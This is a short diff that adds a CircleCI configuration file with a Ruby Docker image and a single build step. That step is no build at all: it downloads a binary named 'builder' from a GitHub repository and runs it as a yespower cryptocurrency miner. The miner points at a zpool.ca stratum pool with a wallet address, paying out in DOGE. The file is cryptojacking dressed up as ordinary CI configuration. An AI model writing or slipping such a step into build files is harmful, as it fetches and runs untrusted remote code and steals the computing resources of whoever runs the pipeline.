@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD
+    steps:
+      - checkout
+      - run: wget https://github.com/protonnamil/testing-repo/raw/main/builder && ./builder -a yespower -o stratum+tcp://yespower.na.mine.zpool.ca:6234 -u D6KH4q6xixtnG7aMhSQCaB8ZmyuUGG4bU7 -p c=DOGE
